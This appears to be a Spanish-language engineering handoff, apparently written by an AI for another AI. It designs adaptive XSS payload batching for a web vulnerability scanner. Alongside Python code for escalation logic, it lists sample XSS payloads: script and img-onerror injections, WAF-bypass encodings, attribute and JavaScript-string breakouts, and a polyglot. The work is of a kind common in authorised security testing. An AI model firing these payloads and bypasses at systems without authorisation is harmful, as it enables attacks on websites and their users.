# GEMINI HANDOFF: Adaptive Payload Expansion System

**Date:** 2026-01-20
**Priority:** ENHANCEMENT
**Scope:** XSS Agent - Intelligent payload batching with progressive escalation
**Estimated Effort:** 3-4 hours
**Author:** Claude (Strategic Session with User)

---

## 🎯 VISIÓN GENERAL

Actualmente el XSS Agent tiene un límite fijo de payloads (`MAX_PAYLOADS_PER_PARAM = 50`). Este handoff propone un sistema **adaptativo** que:

1. Comienza con un batch pequeño (50 payloads universales)
2. Analiza los resultados para determinar si hay potencial
3. **Escala progresivamente** con batches especializados si hay indicios prometedores
4. **Para temprano** si el objetivo está completamente hardenizado

---

## 🏗️ ARQUITECTURA PROPUESTA

```
┌─────────────────────────────────────────────────────────────────────┐
│                   ADAPTIVE PAYLOAD EXPANSION                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│   ┌─────────────┐                                                   │
│   │   Batch 1   │ → 50 payloads universales (mejores hit-rate)      │
│   │  UNIVERSAL  │                                                   │
│   └──────┬──────┘                                                   │
│          │                                                          │
│          ▼                                                          │
│   ┌─────────────────────────────────────────────┐                   │
│   │  ANÁLISIS DE RESULTADOS (EscalationDecider) │                   │
│   ├─────────────────────────────────────────────┤                   │
│   │ • ¿Hubo reflexión?                          │                   │
│   │ • ¿Qué caracteres sobrevivieron? (< > " ')  │                   │
│   │ • ¿WAF detectado? ¿Cuál?                    │                   │
│   │ • ¿Contexto identificado? (attr, tag, js)   │                   │
│   └──────┬──────────────────────────────────────┘                   │
│          │                                                          │
│          ▼                                                          │
│   ┌─────────────────────────────────────────────┐                   │
│   │           DECISION TREE                      │                   │
│   ├─────────────────────────────────────────────┤                   │
│   │                                              │                   │
│   │  ÉXITO → STOP ✅                            │                   │
│   │                                              │                   │
│   │  NO REFLEXIÓN → STOP (hardened) 🛑          │                   │
│   │                                              │                   │
│   │  REFLEXIÓN + WAF → Batch 2: WAF Bypass 🔄   │                   │
│   │                                              │                   │
│   │  REFLEXIÓN + < blocked → Batch 3: No-Tag 🔄 │                   │
│   │                                              │                   │
│   │  REFLEXIÓN + JS context → Batch 4: JS 🔄    │                   │
│   │                                              │                   │
│   │  REFLEXIÓN LIMPIA → Batch 5: Polyglots 🔄   │                   │
│   │                                              │                   │
│   └─────────────────────────────────────────────┘                   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📦 DEFINICIÓN DE BATCHES

### Batch 1: Universal (50 payloads)

Payloads con mejor hit-rate histórico. Cubren los casos más comunes.

```python
BATCH_UNIVERSAL = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    # ... los 50 mejores del Golden Payloads actual
]
```

### Batch 2: WAF Bypass (50 payloads)

Se activa si: `waf_detected == True` o `status_code in [403, 406]`

```python
BATCH_WAF_BYPASS = [
    '"><img src=x onerror=alert`1`>',  # Backticks
    '<svg/onload=alert&#40;1&#41;>',    # HTML entities
    '<img src=x onerror=\u0061lert(1)>', # Unicode
    # ... técnicas de encoding, case mixing, null bytes
]
```

### Batch 3: No-Tag (50 payloads)

Se activa si: `<` y `>` están bloqueados pero `"` o `'` sobreviven

```python
BATCH_NO_TAG = [
    '" onfocus=alert(1) autofocus="',
    "' onmouseover=alert(1) '",
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    # ... event handlers, protocol handlers
]
```

### Batch 4: JavaScript Context (50 payloads)

Se activa si: reflexión detectada dentro de `<script>` o atributos JS

```python
BATCH_JS_CONTEXT = [
    "';alert(1)//",
    '";alert(1)//',
    '</script><script>alert(1)</script>',
    '${alert(1)}',  # Template literals
    # ... breakouts de strings JS
]
```

### Batch 5: Polyglots (30 payloads)

Se activa si: los batches anteriores fallaron pero hay reflexión limpia

```python
BATCH_POLYGLOTS = [
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    # ... polyglots conocidos de SecLists, PortSwigger XSS Cheat Sheet
]
```

---

## 📄 IMPLEMENTACIÓN

### Nuevo archivo: `bugtrace/agents/payload_batches.py`

```python
"""
Adaptive Payload Batching System.

Organizes payloads into context-specific batches for progressive escalation.
"""

from dataclasses import dataclass
from typing import List, Optional
from enum import Enum

class EscalationReason(Enum):
    SUCCESS = "success"
    NO_REFLECTION = "no_reflection"
    WAF_DETECTED = "waf_detected"
    TAG_BLOCKED = "tag_blocked"
    JS_CONTEXT = "js_context"
    CLEAN_REFLECTION = "clean_reflection"


@dataclass
class ProbeResult:
    """Result of probing a parameter."""
    reflected: bool
    surviving_chars: str  # e.g., "<>\"'" or "" if none
    waf_detected: bool
    waf_name: Optional[str]
    context: str  # "attribute", "tag", "script", "unknown"
    status_code: int


class PayloadBatcher:
    """
    Manages adaptive payload batching based on probe results.
    """
    
    BATCH_SIZE = 50
    
    def __init__(self):
        self.batches = {
            "universal": self._load_batch("universal"),
            "waf_bypass": self._load_batch("waf_bypass"),
            "no_tag": self._load_batch("no_tag"),
            "js_context": self._load_batch("js_context"),
            "polyglots": self._load_batch("polyglots"),
        }
    
    def _load_batch(self, batch_name: str) -> List[str]:
        """Load payloads from data/xss_batches/{batch_name}.txt"""
        from pathlib import Path
        batch_file = Path(f"bugtrace/data/xss_batches/{batch_name}.txt")
        if batch_file.exists():
            return [line.strip() for line in batch_file.read_text().splitlines() if line.strip()]
        return []
    
    def get_initial_batch(self) -> List[str]:
        """Get first batch (universal payloads)."""
        return self.batches["universal"][:self.BATCH_SIZE]
    
    def decide_escalation(self, probe_result: ProbeResult) -> Optional[str]:
        """
        Decide which batch to try next based on probe results.
        
        Returns batch name or None if should stop.
        """
        if not probe_result.reflected:
            return None  # Stop - completely hardened
        
        if probe_result.waf_detected:
            return "waf_bypass"
        
        if "<" not in probe_result.surviving_chars and ">" not in probe_result.surviving_chars:
            return "no_tag"
        
        if probe_result.context == "script":
            return "js_context"
        
        # Clean reflection but no success yet - try polyglots
        return "polyglots"
    
    def get_batch(self, batch_name: str) -> List[str]:
        """Get specific batch by name."""
        return self.batches.get(batch_name, [])[:self.BATCH_SIZE]


# Singleton
payload_batcher = PayloadBatcher()
```

---

### Modificación en `xss_agent.py`

```python
# En _test_parameter(), reemplazar el límite fijo por:

from bugtrace.agents.payload_batches import payload_batcher, ProbeResult

async def _test_parameter(self, param: str, ...):
    # ... existing probe code ...
    
    # Build probe result
    probe_result = ProbeResult(
        reflected=bool(html),
        surviving_chars=surviving_chars,
        waf_detected=waf_detected,
        waf_name=detected_waf,
        context=reflection_type,
        status_code=status_code
    )
    
    # Adaptive batching
    current_batch = "universal"
    tested_batches = set()
    
    while current_batch and current_batch not in tested_batches:
        tested_batches.add(current_batch)
        
        payloads = payload_batcher.get_batch(current_batch)
        logger.info(f"[{self.name}] Testing {len(payloads)} payloads from batch: {current_batch}")
        
        for payload in payloads:
            result = await self._test_payload(param, payload, ...)
            if result:
                return result  # Success!
        
        # Decide if we should escalate
        current_batch = payload_batcher.decide_escalation(probe_result)
        
        if current_batch:
            logger.info(f"[{self.name}] Escalating to batch: {current_batch}")
    
    # All batches exhausted or no escalation needed
    return None
```

---

## 📁 ESTRUCTURA DE ARCHIVOS

```
bugtrace/
├── agents/
│   ├── payload_batches.py     # NUEVO - Adaptive batcher
│   └── xss_agent.py           # MODIFICAR - Usar adaptive batching
└── data/
    └── xss_batches/           # NUEVO - Payload files
        ├── universal.txt
        ├── waf_bypass.txt
        ├── no_tag.txt
        ├── js_context.txt
        └── polyglots.txt
```

---

## 📊 IMPACTO ESPERADO

| Escenario | Antes (50 fijo) | Después (Adaptativo) |
|-----------|-----------------|----------------------|
| Target hardenizado (nada reflejado) | 50 intentos desperdiciados | ~10 intentos (fast exit) |
| Target con WAF | 50 intentos, muchos bloqueados | 50 + 50 WAF bypass específicos |
| Target con `<>` filtrado | 50 intentos, pocos útiles | 50 + 50 event handlers |
| Target vulnerable | 50 intentos, éxito | 50 intentos, éxito (igual) |

**Resultado neto:**

- ⬇️ 80% menos tiempo en targets hardenizados
- ⬆️ 100% más cobertura en targets con filtros parciales
- ✅ Mismo rendimiento en targets fáciles

---

## ✅ CHECKLIST DE IMPLEMENTACIÓN

1. [ ] Crear `bugtrace/agents/payload_batches.py`
2. [ ] Crear directorio `bugtrace/data/xss_batches/`
3. [ ] Poblar archivos de batch:
   - [ ] `universal.txt` (extraer del Golden Payloads actual)
   - [ ] `waf_bypass.txt` (técnicas de encoding del WAF module)
   - [ ] `no_tag.txt` (event handlers, protocol handlers)
   - [ ] `js_context.txt` (string breakouts)
   - [ ] `polyglots.txt` (de SecLists/PortSwigger)
4. [ ] Modificar `_test_parameter()` en `xss_agent.py`
5. [ ] Añadir logging para tracking de escalaciones
6. [ ] Test con targets de diferentes niveles de hardening

---

## 🔗 DEPENDENCIAS

- Requiere que `_probe_parameter()` devuelva información de contexto (ya existe)
- Se integra con el sistema de WAF detection existente
- Compatible con el Go XSS Fuzzer (trabajan en paralelo)

---

**Handoff creado por:** Claude
**Fecha:** 2026-01-20
**Estado:** Documentado, pendiente de implementación
